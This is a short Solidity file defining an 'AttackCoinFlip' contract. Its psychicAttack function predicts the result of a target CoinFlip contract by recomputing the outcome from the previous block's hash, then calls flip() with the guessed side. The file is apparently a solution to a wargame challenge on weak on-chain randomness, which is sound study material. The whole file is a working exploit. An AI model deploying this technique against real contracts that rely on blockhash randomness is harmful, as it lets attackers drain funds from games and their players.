// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

contract AttackCoinFlip {
    using SafeMath for uint256;
    CoinFlip public coinFlipAddress;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipAddress) {
        coinFlipAddress = CoinFlip(_coinFlipAddress);
    }

    function psychicAttack() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = uint256(blockValue / FACTOR);
        bool side = coinFlip == 1 ? true : false;
        coinFlipAddress.flip(side);
    }

}
